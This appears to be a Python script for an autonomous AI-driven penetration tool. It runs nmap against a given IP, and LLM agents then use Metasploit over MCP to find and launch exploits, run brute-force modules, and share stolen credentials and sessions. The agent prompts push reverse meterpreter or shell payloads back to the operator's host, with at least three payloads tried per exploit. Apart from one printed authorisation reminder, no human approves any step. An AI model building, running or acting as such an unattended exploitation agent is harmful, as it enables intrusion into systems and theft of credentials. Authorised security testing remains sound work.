import asyncio
import fcntl
import json
import os
import re
import socket
import subprocess
import sys
import tempfile

from langchain_openai import ChatOpenAI
from langchain_mcp_adapters.client import MultiServerMCPClient
from langchain_core.messages import HumanMessage, SystemMessage, ToolMessage
from langchain_core.tools import tool


VLLM_BASE = "http://192.168.178.13:8003/v1"
VLLM_MODEL = "Qwen/Qwen3-235B-A22B-Instruct-2507-FP8"

util_llm = ChatOpenAI(
    base_url=VLLM_BASE,
    api_key="EMPTY",
    model=VLLM_MODEL,
    temperature=0.1,
)

pentest_llm = ChatOpenAI(
    base_url=VLLM_BASE,
    api_key="EMPTY",
    model=VLLM_MODEL,
    temperature=0.3,
)

TOOL_OUTPUT_LIMIT = 2000
MAX_HISTORY = 40
MAX_ITERATIONS = 100
MAX_AGENTS = 8
MCP_POOL_SIZE = 8  # one dedicated MSF subprocess per agent slot

_token_lock = asyncio.Lock()
_total_input_tokens = 0
_total_output_tokens = 0
LPORTS = [443, 80, 8443, 8080, 8888, 9443, 9090, 9000]
DISCOVERIES_FILE = "/home/user/PycharmProjects/chaining/discoveries.json"
LOCK_FILE = DISCOVERIES_FILE + ".lock"

SERVICE_PRIORITY = [
    "ftp", "ssh", "telnet", "smb", "netbios", "microsoft-ds",
    "rdp", "ms-wbt-server", "http", "https", "mysql", "mssql",
    "postgres", "oracle", "mongodb", "redis", "vnc", "rpc",
    "nfs", "irc", "snmp", "ldap", "smtp", "pop3", "imap",
]


def service_rank(port_info: dict) -> int:
    svc = (port_info.get("service") or "").lower()
    for i, keyword in enumerate(SERVICE_PRIORITY):
        if keyword in svc:
            return i
    return len(SERVICE_PRIORITY)



def get_local_ip(target: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((target, 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def run_nmap(ip: str) -> str:
    cmd = [
        "nmap", "-sV", "-Pn", "-n",
        "-T4", "--min-rate", "1000",
        "--version-intensity", "5",
        ip,
    ]
    print(f"[*] Running {' '.join(cmd)} ...")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    if result.returncode != 0:
        print(f"[!] nmap stderr: {result.stderr}", file=sys.stderr)
    return result.stdout


def load_discoveries() -> dict:
    if not os.path.exists(DISCOVERIES_FILE):
        return {}
    try:
        with open(DISCOVERIES_FILE) as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}


def _save_discovery(port: int, key: str, value: str):
    with open(LOCK_FILE, "w") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        try:
            data = load_discoveries()
            data.setdefault(str(port), {})[key] = value
            dir_ = os.path.dirname(DISCOVERIES_FILE) or "."
            fd, tmp = tempfile.mkstemp(dir=dir_, prefix=".discoveries_", suffix=".json")
            with os.fdopen(fd, "w") as f:
                json.dump(data, f, indent=2)
            os.replace(tmp, DISCOVERIES_FILE)
        finally:
            fcntl.flock(lock, fcntl.LOCK_UN)


@tool
def save_discovery(port: int, key: str, value: str) -> str:
    """Save a finding to the shared discoveries file so other agents see it next iteration.
    Use for: credentials (key='credentials'), confirmed versions (key='version'),
    useful paths/endpoints (key='path'), session IDs (key='session'),
    or any notable finding. `value` must be a short string (<200 chars)."""
    _save_discovery(port, key, value[:200])
    return f"Saved [{port}] {key}={value[:60]}"


def parse_ports(services_text: str) -> list[dict]:
    """Ask the LLM to return a JSON list of {port, protocol, service, version} dicts."""
    msgs = [
        SystemMessage(content=(
            "You are a security scanner assistant. Given a structured list of discovered services, "
            "return ONLY a valid JSON array — no markdown, no explanation. "
            'Each element: {"port": <int>, "protocol": "tcp"|"udp", "service": "<name>", "version": "<string or empty>"}'
        )),
        HumanMessage(content=f"Extract ports from:\n\n{services_text}"),
    ]
    response = util_llm.invoke(msgs)
    raw = response.content.strip()

    match = re.search(r'\[.*\]', raw, re.DOTALL)
    if match:
        try:
            ports = json.loads(match.group())
            if isinstance(ports, list) and all("port" in p for p in ports):
                return ports
        except json.JSONDecodeError:
            pass

    print("[!] Could not parse port list from LLM — falling back to single agent.")
    return [{"port": 0, "protocol": "tcp", "service": "ALL", "version": services_text}]


def trim_messages(msgs: list) -> list:
    system = [m for m in msgs if isinstance(m, SystemMessage)]
    rest = [m for m in msgs if not isinstance(m, SystemMessage)]
    return system + rest[-MAX_HISTORY:]


def build_agent_prompt(
    port_info: dict,
    target_ip: str,
    lhost: str,
    lport: int,
    all_services_text: str,
) -> tuple[str, str]:
    port = port_info["port"]
    service = port_info["service"]
    version = port_info.get("version", "")
    protocol = port_info.get("protocol", "tcp")

    system_prompt = (
        f"You are a penetration testing assistant for an authorized assessment against {target_ip}.\n"
        f"Your ONLY focus: {protocol}/{port} running {service} {version}.\n\n"
        f"Available Metasploit tools:\n"
        f"  - list_exploits(search_term): search exploits by service/product name\n"
        f"  - list_payloads(module_name): get ALL compatible payloads for a specific exploit module\n"
        f"  - run_auxiliary_module(module_name, options): run scanner or brute-force modules\n"
        f"  - run_exploit(module_name, options, payload_name, payload_options): run exploits — payload_name is MANDATORY\n"
        f"  - list_active_sessions(): check for active shells\n\n"
        f"Shared-state tool:\n"
        f"  - save_discovery(port, key, value): share a finding with the other agents\n\n"
        f"CRITICAL: parameter is 'module_name', NOT 'module_path'\n\n"
        f"LHOST: {lhost}  — always use this exact IP\n"
        f"YOUR LPORT: {lport}\n\n"
        f"PAYLOAD SELECTION:\n"
        f"  1. Call list_payloads(module_name=<exploit>) before running any exploit\n"
        f"  2. Try reverse payloads first (LHOST={lhost}, LPORT={lport}), then bind if reverse fails\n"
        f"  3. Priority: meterpreter > shell > cmd payloads; x64 > x86\n"
        f"  4. payload_name is MANDATORY in run_exploit\n"
        f"  5. Try at least 3 different payloads before abandoning an exploit\n"
        f"  6. Call list_active_sessions after every attempt\n\n"
        f"Workflow:\n"
        f"  1. Run auxiliary version scanners to confirm exact version\n"
        f"  2. Search exploits matching the confirmed service/version\n"
        f"  3. Prioritize by rank: excellent/great first\n"
        f"  4. For each exploit: list_payloads → pick best → run_exploit\n"
        f"  5. On failure: retry with alternative payloads\n"
        f"  6. Summarize findings when done\n\n"
        f"When you discover credentials, versions, paths, or sessions, call save_discovery(port={port}, key, value) "
        f"so other agents benefit.\n"
    )

    human_msg = (
        f"Target {target_ip} — all discovered services for context:\n{all_services_text}\n\n"
        f"Your port: {protocol}/{port} ({service} {version})\n\n"
        f"Start by searching for exploits for {service}."
    )

    return system_prompt, human_msg


async def run_agent_loop(
    port_info: dict,
    target_ip: str,
    lhost: str,
    lport: int,
    all_services_text: str,
    msf_tools: list,
) -> str:
    label = f"{port_info.get('port', '?')}/{port_info.get('service', '?')}"
    all_tools = list(msf_tools) + [save_discovery]
    tools_by_name = {t.name: t for t in all_tools}
    llm_with_tools = pentest_llm.bind_tools(all_tools, tool_choice="auto")

    system_prompt, human_msg = build_agent_prompt(
        port_info, target_ip, lhost, lport, all_services_text
    )
    msgs = [SystemMessage(content=system_prompt), HumanMessage(content=human_msg)]

    final_content = f"[{label}] No output produced."
    for iteration in range(MAX_ITERATIONS):
        print(f"\n[{label}] Iteration {iteration + 1}/{MAX_ITERATIONS}")

        trimmed = trim_messages(msgs)
        discoveries = load_discoveries()
        if discoveries:
            summary = json.dumps(discoveries, indent=2)[:800]
            trimmed[0] = SystemMessage(
                content=trimmed[0].content
                + f"\n\n[SHARED FINDINGS FROM OTHER AGENTS]\n{summary}"
            )

        response = await llm_with_tools.ainvoke(trimmed)
        msgs.append(response)

        usage = (response.response_metadata or {}).get("token_usage") or {}
        if usage:
            async with _token_lock:
                global _total_input_tokens, _total_output_tokens
                _total_input_tokens += usage.get("prompt_tokens", 0)
                _total_output_tokens += usage.get("completion_tokens", 0)

        if response.content:
            print(f"[{label}] {response.content}")
            final_content = response.content

        if not response.tool_calls:
            if not response.content:
                print(f"[{label}] Empty response — stopping.")
            print(f"[{label}] Agent done.")
            break

        for tool_call in response.tool_calls:
            name = tool_call["name"]
            args = tool_call["args"]
            print(f"[{label}][TOOL] -> {name}({args})")

            if name not in tools_by_name:
                result_str = f"ERROR: unknown tool '{name}'"
            else:
                try:
                    result = await tools_by_name[name].ainvoke(tool_call)
                    result_str = str(result)
                except Exception as e:
                    result_str = f"ERROR: {e}"

            preview = result_str[:500] + ("..." if len(result_str) > 500 else "")
            print(f"[{label}][TOOL] <- {preview}")

            stored = result_str[:TOOL_OUTPUT_LIMIT] + (
                " [truncated]" if len(result_str) > TOOL_OUTPUT_LIMIT else ""
            )
            msgs.append(ToolMessage(content=stored, tool_call_id=tool_call["id"]))
    else:
        print(f"[{label}] Hit max iterations ({MAX_ITERATIONS}).")

    return final_content


async def main(target_ip: str):

    for path in (DISCOVERIES_FILE, LOCK_FILE):
        if os.path.exists(path):
            os.remove(path)

    print("=" * 60)
    print(f"AI-Assisted Security Assessment — Target: {target_ip}")
    print("=" * 60)
    print("\n[!] Only run this against systems you are authorized to test.\n")

    lhost = get_local_ip(target_ip)
    print(f"[*] Detected LHOST: {lhost}")

    raw_scan = run_nmap(target_ip)
    parse_msgs = [
        SystemMessage(content=(
            "You are a security scanner assistant. Given raw nmap output, "
            "extract a clean structured list of open ports, the service "
            "running on each, and the detected version. Be concise."
        )),
        HumanMessage(content=f"Parse this nmap output:\n\n{raw_scan}"),
    ]
    parsed = util_llm.invoke(parse_msgs)
    services_text = parsed.content
    print("\n[+] Stage 1 — Parsed services:\n")
    print(services_text)

    print("\n[*] Extracting individual ports...")
    ports = parse_ports(services_text)
    ports.sort(key=service_rank)

    num_workers = min(MAX_AGENTS, len(ports))
    print(f"\n[*] {len(ports)} port(s) queued, processed by {num_workers} worker(s) "
          f"(each with a dedicated Metasploit subprocess)")
    print("    Priority order:")
    for p in ports:
        print(f"      [{p.get('port')}/{p.get('service')}] — {p.get('version', '')}")

    mcp_cfg = {
        "metasploit": {
            "command": "/home/user/metasploit-mcp.sh",
            "args": [],
            "transport": "stdio",
        }
    }
    mcp_clients = [MultiServerMCPClient(mcp_cfg) for _ in range(MCP_POOL_SIZE)]
    msf_tools_pool = [await c.get_tools() for c in mcp_clients]
    print(f"\n[*] Spawned {MCP_POOL_SIZE} MCP subprocesses ({len(msf_tools_pool[0])} tools each)\n")

    queue: asyncio.Queue = asyncio.Queue()
    for p in ports:
        queue.put_nowait(p)

    results: dict[str, str] = {}

    async def worker(worker_id: int):
        lport = LPORTS[worker_id]
        msf_tools = msf_tools_pool[worker_id % MCP_POOL_SIZE]
        while True:
            try:
                port_info = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            key = f"{port_info.get('port')}/{port_info.get('service')}"
            try:
                results[key] = await run_agent_loop(
                    port_info=port_info,
                    target_ip=target_ip,
                    lhost=lhost,
                    lport=lport,
                    all_services_text=services_text,
                    msf_tools=msf_tools,
                )
            except Exception as e:
                results[key] = f"ERROR: {e}"
            finally:
                queue.task_done()

    workers = [asyncio.create_task(worker(i)) for i in range(num_workers)]
    await asyncio.gather(*workers)

    def _fmt(p: dict) -> str:
        key = f"{p.get('port')}/{p.get('service')}"
        return f"=== {key} Agent ===\n{results.get(key, '(no result)')}"

    combined_analysis = "\n\n".join(_fmt(p) for p in ports)

    print("\n[+] Stage 2 — Pentest analysis (all agents):\n")
    print(combined_analysis)

    report_msgs = [
        SystemMessage(content=(
            "You are a security report writer. Produce a short, professional "
            "command-line report (under 400 words). STRICT RULES:\n"
            "- Only report findings verbatim from the data below.\n"
            "- If no exploits were verified, say so explicitly.\n"
            "- Do not invent CVEs, dates, or severity ratings not present in the data.\n"
            "- Distinguish 'confirmed exploitable' from 'potentially vulnerable (not verified)'."
        )),
        HumanMessage(content=(
            f"Target: {target_ip}\n\n"
            f"Discovered services:\n{services_text}\n\n"
            f"Pentest analysis:\n{combined_analysis}\n\n"
            f"Shared discoveries JSON:\n{json.dumps(load_discoveries(), indent=2)}\n\n"
            "Write the final report. Only include facts from the data above."
        )),
    ]
    report = await util_llm.ainvoke(report_msgs)
    usage = (report.response_metadata or {}).get("token_usage") or {}
    _total_input_tokens += usage.get("prompt_tokens", 0)
    _total_output_tokens += usage.get("completion_tokens", 0)

    print("\n" + "=" * 60)
    print("FINAL REPORT")
    print("=" * 60)
    print(report.content)
    print("=" * 60)
    print(f"\n[TOKEN USAGE] Input: {_total_input_tokens:,}  Output: {_total_output_tokens:,}  Total: {_total_input_tokens + _total_output_tokens:,}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python main4.py <target_ip>")
        sys.exit(1)
    asyncio.run(main(sys.argv[1]))
